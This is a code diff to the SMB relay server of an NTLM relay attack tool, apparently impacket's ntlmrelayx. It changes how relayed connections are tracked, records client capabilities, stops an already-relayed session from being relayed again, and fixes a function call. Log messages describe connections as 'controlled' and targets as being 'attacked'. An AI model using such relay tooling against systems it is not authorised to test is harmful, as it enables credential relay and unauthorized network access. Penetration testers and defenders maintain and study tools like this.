@@ -713,7 +713,8 @@ class SMBRelayServer(Thread):
 
                 # Done with the relay for now.
                 connData['Authenticated'] = True
-                connData['relayToHost'] = False
+                if 'relayToHost' in connData:
+                    del(connData['relayToHost'])
 
                 # Status SUCCESS
                 errorCode = STATUS_SUCCESS
@@ -730,6 +731,7 @@ class SMBRelayServer(Thread):
         else:
             # Process Standard Security
             #TODO: Fix this for other protocols than SMB [!]
+            LOG.debug("(SMB) Process standatd Security authentication")
             respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
             respData       = smb.SMBSessionSetupAndXResponse_Data()
             sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
@@ -737,6 +739,7 @@ class SMBRelayServer(Thread):
             sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
             sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
             sessionSetupData.fromString(SMBCommand['Data'])
+            connData['Capabilities'] = sessionSetupParameters['Capabilities']
 
             client = connData['SMBClient']
             _, errorCode = client.sendStandardSecurityAuth(sessionSetupData)
@@ -806,13 +809,13 @@ class SMBRelayServer(Thread):
         authenticateMessage = connData['AUTHENTICATE_MESSAGE']
         self.authUser = authenticateMessage.getUserString()
 
-        if self.config.disableMulti:
-            return self.origsmbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
+        # if self.config.disableMulti:
+        #     return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
         # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
         # are processed. There might be a use case for this
-        #if 'relayToHost' in connData:
-        #    # Connection already relayed, let's just answer the request (that will return object not found)
-        #    return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
+        if 'relayToHost' in connData:
+           # Connection already relayed, let's just answer the request (that will return object not found)
+           return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
 
         try:
             if self.config.mode.upper () == 'REFLECTION':
@@ -826,7 +829,7 @@ class SMBRelayServer(Thread):
                 else:
                     # No more targets to process, just let the victim to fail later
                     LOG.info('(SMB): Connection from %s@%s controlled, but there are no more targets left!' % (self.authUser, connData['ClientIP']))
-                    return self.origsmbComTreeConnectAndX (connId, smbServer, recvPacket)
+                    return self.origsmbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
 
             LOG.info('(SMB): Connection from %s@%s controlled, attacking target %s://%s' % (self.authUser, connData['ClientIP'], self.target.scheme, self.target.netloc))
 
